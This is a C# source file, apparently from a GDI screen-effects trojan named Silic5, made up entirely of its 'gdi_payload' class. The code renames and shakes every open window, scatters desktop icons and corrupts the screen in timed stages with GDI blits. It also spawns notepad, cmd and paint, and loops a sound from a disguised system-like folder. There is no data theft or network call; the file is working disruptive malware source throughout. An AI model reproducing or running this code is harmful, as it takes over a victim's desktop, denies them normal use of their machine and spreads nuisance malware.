using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static Silic5.Dll_Imports;

namespace Silic5
{
    public class gdi_payload
    {
        private SoundPlayer amb1;
        public void loop_titles()
        {
            Random rand;
            while (true)
            {
                var generator_h = new Generator();
                rand = new Random();
                IntPtr hwnd = Dll_Imports.GetTopWindow(Dll_Imports.GetDesktopWindow());
                hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDLAST);
                do
                {
                    Dll_Imports.SetWindowText(hwnd, generator_h.GenerateToken(rand.Next(100)));
                } while ((hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDPREV)) != IntPtr.Zero);
                Thread.Sleep(100);
            }
        }
        public void sound_effect()
        {
            Random rand;
            rand = new Random();
            string resources_path = @"C:\Program Files (x86)\Microsoft\Temp\";
            string[] snd_list = { resources_path + "noise2.wav" };
            if (File.Exists(snd_list[0])){
                amb1 = new SoundPlayer(snd_list[0]);
                amb1.PlayLooping();
            }          
        }
        public void gdi_payloads()
        {
            Stopwatch sw = Stopwatch.StartNew();
            bool processesStarted = false;
            int stage = 1;
            Random r;
            int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
            int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
            POINT[] lppoint = new POINT[3];
            while (true)
            {
                r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr holdbit = SelectObject(mhdc, hbit);
                IntPtr handle = Dll_Imports.FindWindow("Progman", null);
                handle = Dll_Imports.FindWindowEx(handle, IntPtr.Zero, "SHELLDLL_DefView", null);
                handle = Dll_Imports.FindWindowEx(handle, IntPtr.Zero, "SysListView32", null);
                DirectoryInfo dirinfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                FileInfo[] finfo = dirinfo.GetFiles();
                for (int num = 0; num <= finfo.Length + 2; num++)
                {
                    Dll_Imports.SendMessage(handle, Dll_Imports.LVM_SETITEMPOSITION, (IntPtr)num, Dll_Imports.MakeLParam(r.Next(x), r.Next(y)));
                    int rand = r.Next(y);
                    if (stage == 1)
                    {
                        BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                        AlphaBlend(hdc, r.Next(-7, 7), r.Next(-7, 7), x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 70, 0));

                        if (sw.ElapsedMilliseconds >= 35000)
                        {
                            stage = 2;
                            sw.Restart();
                        }
                    }
                    else if (stage == 2)
                    {
                        BitBlt(hdc, rand, r.Next(-100, 100), r.Next(200), y, hdc, rand, 0, TernaryRasterOperations.SRCCOPY);

                        if (sw.ElapsedMilliseconds >= 40000)
                        {
                            stage = 3;
                            sw.Restart();
                        }
                    }
                    else if (stage == 3)
                    {
                        if (!processesStarted)
                        {
                            Process.Start("notepad.exe");
                            Process.Start("cmd.exe");
                            Process.Start("mspaint.exe");
                            processesStarted = true;
                        }
                        StretchBlt(hdc, (r.Next(2) == 1) ? -10 : 10, (r.Next(2) == 1) ? -10 : 10, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCAND);

                        if (sw.ElapsedMilliseconds >= 95000)
                        {
                            break;
                        }
                    }
                    SelectObject(mhdc, holdbit);
                    DeleteObject(holdbit);
                    DeleteObject(hbit);
                    DeleteDC(mhdc);
                    DeleteDC(hdc);
                    Thread.Sleep(10);
                }
            }
        }
        public void window_shake()
        {
            Random rand;
            while (true)
            {
                rand = new Random();
                IntPtr hwnd = Dll_Imports.GetTopWindow(Dll_Imports.GetDesktopWindow());
                hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDLAST);
                do
                {
                    Dll_Imports.RECT myrect;
                    Dll_Imports.GetWindowRect(hwnd, out myrect);
                    Dll_Imports.MoveWindow(hwnd, myrect.Left + rand.Next(-40, 41), myrect.Top + rand.Next(-40, 41),
                    myrect.Right - myrect.Left, myrect.Bottom - myrect.Top, true);
                } while ((hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDPREV)) != IntPtr.Zero);
                if (payload_timer.extreme == false)
                    Thread.Sleep(1);
                else 
                    Thread.Sleep(1);
            }
        }
    }
}
